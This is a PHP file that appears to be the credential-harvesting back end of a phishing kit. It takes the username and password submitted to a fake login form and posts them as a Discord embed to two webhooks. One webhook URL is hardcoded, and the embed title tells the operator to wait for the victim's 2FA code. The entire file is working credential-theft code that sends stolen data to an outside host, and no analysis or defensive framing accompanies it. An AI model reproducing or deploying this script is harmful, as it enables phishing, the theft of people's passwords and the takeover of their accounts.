<?php
include ('setup.php');
$username = $_POST['username'];
$password = $_POST['password'];
$dwebhook = "https://discord.com/api/webhooks/901418693374926878/vNNsX7DJwkp3RCxTWjdaazChiIk9YoHFZFDl8BSWtvj-_txhw2j3AW0PF__t9pFWYzPz";
$hookObject = json_encode([
            "username" => "WxR Notification",
            "avatar_url" => "https://cdn.discordapp.com/attachments/882339669319245904/885694774521237504/standard.gif",
             "content" => "",
                "embeds" => [
                    [
                        "title" => 'Someone Logged In, But They Verified Gmail/2FA, Just Wait Until They Put The 2FA Code!',
                        "type" => "rich",
                        "url" => "https://discord.gg/MhjD6tmAWn",
                        "color" => hexdec("ff0000"),
                        "thumbnail" => [
                            "url" => "https://images-ext-2.discordapp.net/external/QXYUGtfSnOmgQj0Y245VmFeZd9664UhvbCn-Ooo5rqw/https/images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif"
                        ],
                        "author" => [
                             "name" => "",
                             "url" => ""
                        ],
                        "fields" => [
                            [
                                "name" => "Username",
                                "value" => "```" . $username . "```",
                                "inline" => True
                            ],
                            [
                                "name" => "Password",
                                "value" => "```" . $password . "```",
                                "inline" => True
                            ],
                        ]
                    ],
                ],
            
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => "$webhook",
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $hookObject,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
  
                                        
        $response = curl_exec($ch);
        curl_close($ch);
                $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => "$dwebhook",
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $hookObject,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
  
                                        
        $response = curl_exec($ch);
        curl_close($ch);
?>